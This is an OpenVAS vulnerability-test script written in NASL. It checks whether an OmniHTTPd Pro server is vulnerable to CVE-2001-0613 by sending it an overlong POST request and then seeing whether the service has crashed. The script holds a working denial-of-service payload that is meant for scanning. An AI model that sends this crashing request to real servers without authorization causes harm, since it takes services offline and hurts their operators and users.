# OpenVAS Vulnerability Test
# $Id: OmniHTTPd_pro_post_dos.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: OmniHTTPd pro long POST DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running OmniHTTPd Pro HTTP Server.

The remote version of this software seems to be vulnerable to a buffer 
overflow when handling specially long POST request. This may allow an
attacker to crash the remote service, thus preventing it from answering 
legitimate client requests.";

tag_solution = "None at this time";

#  Ref: SNS Research  - <vuln-dev@greyhack com>

if(description)
{
 script_id(15553);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2730);
 script_cve_id("CVE-2001-0613");
 script_xref(name:"OSVDB", value:"1829");
 
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 
 name = "OmniHTTPd pro long POST DoS";
 script_name(name);
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "Denial of Service";
 
 script_family(family);
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("OmniHTTPd/banner");
 script_require_ports("Services/www",80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( http_is_dead(port:port) ) exit(0);

banner = get_http_banner(port:port);
if ( ! banner ) exit(0);
if ( ! egrep(pattern:"^Server: OmniHTTPd", string:banner ) ) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

len = 4200;	# 4111 should be enough
req = string("POST ", "/", " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
send(socket:soc, data:req);
http_close_socket(soc);

sleep(1);

if(http_is_dead(port: port))
{
 security_message(port);
 exit(0);
} 
